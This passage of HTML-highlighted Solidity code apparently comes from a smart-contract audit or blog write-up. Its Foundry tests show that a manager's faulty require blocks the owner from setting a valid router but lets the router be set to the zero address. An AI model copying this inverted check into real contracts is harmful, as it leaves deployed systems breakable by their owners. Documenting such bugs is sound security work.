class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) { \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efalse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) { \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecreatePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) { \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetGenesisPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_genesisPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// --- Test Contract ---\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003econtract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGenesisPoolManagerRouterTest\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTest\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eSimplifiedGenesisPoolManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emanager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewValidRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockGenesisPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockPairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockPairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enonOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetUp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Test contract itself is the owner\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enonOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0xBAD\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eMockRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewValidRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eMockRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eMockGenesisPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockPairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eMockPairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emanager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eSimplifiedGenesisPoolManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockPairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Sanity check initial router\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eassertEq\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emanager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Initial router not set correctly\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etest_ownerCannotSetValidNewRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eprank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpectRevert\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;ZA\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Expect ZA (Zero Address) error due to the faulty require\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emanager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewValidRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Router should remain unchanged\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eassertEq\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emanager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Router was changed when it shouldn\u0026#39;t have been\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etest_ownerCanSetRouterToZeroAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eprank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emanager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// This call will succeed\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eassertEq\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emanager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Router was not set to address(0)\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etest_nonOwnerCannotCallSetRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eprank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enonOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpectRevert\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Not owner\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emanager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewValidRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eprank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enonOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpectRevert\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Not 